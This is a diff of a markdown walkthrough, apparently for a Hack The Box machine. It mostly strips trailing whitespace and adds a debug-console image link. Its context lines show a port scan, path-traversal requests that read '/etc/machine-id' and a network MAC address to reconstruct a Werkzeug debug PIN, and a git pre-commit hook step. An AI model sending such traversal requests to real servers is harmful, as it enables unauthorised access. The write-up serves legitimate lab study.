@@ -7,15 +7,15 @@
 ```shell
 PORT     STATE    SERVICE VERSION
 22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
 |   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
 |_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
 80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
 |_http-server-header: Werkzeug/2.1.2 Python/3.10.3
 |_http-title: upcloud - Upload files for Free!
-| fingerprint-strings: 
-|   GetRequest: 
+| fingerprint-strings:
+|   GetRequest:
 |     HTTP/1.1 200 OK
 |     Server: Werkzeug/2.1.2 Python/3.10.3
 |     Date: Mon, 06 Jun 2022 17:16:28 GMT
@@ -35,7 +35,7 @@ PORT     STATE    SERVICE VERSION
 |     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
 |     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
 |     <link rel=
-|   HTTPOptions: 
+|   HTTPOptions:
 |     HTTP/1.1 200 OK
 |     Server: Werkzeug/2.1.2 Python/3.10.3
 |     Date: Mon, 06 Jun 2022 17:16:28 GMT
@@ -43,7 +43,7 @@ PORT     STATE    SERVICE VERSION
 |     Allow: HEAD, GET, OPTIONS
 |     Content-Length: 0
 |     Connection: close
-|   RTSPRequest: 
+|   RTSPRequest:
 |     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
 |     "http://www.w3.org/TR/html4/strict.dtd">
 |     <html>
@@ -96,6 +96,8 @@ cat app/app/configuration.py
 ```
 
 In debug mode, there's a web accessible at `/console`. It is password protected but the [pin is guessable][hacktricks-pin].
+
+![][debug-console]
 
 There's a dev branch too:
 
@@ -245,7 +247,7 @@ GET uploads/..//sys/class/net/eth0/address HTTP/1.1
 # 02:42:ac:11:00:04
 ```
 
-And finally, Werkzeug produces the machine ID by reading from a few files: 
+And finally, Werkzeug produces the machine ID by reading from a few files:
 
 ```shell
 GET uploads/..//etc/machine-id HTTP/1.1
@@ -368,6 +370,7 @@ chmod +x .git/hooks/pre-commit
 Voilà :)
 
 [author-profile]: https://app.hackthebox.com/users/476556
+[debug-console]: images/debug-console.png
 [gitea]: images/gitea.png
 [hacktricks-pin]: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
 [pin-leak]: images/pin-leak.png
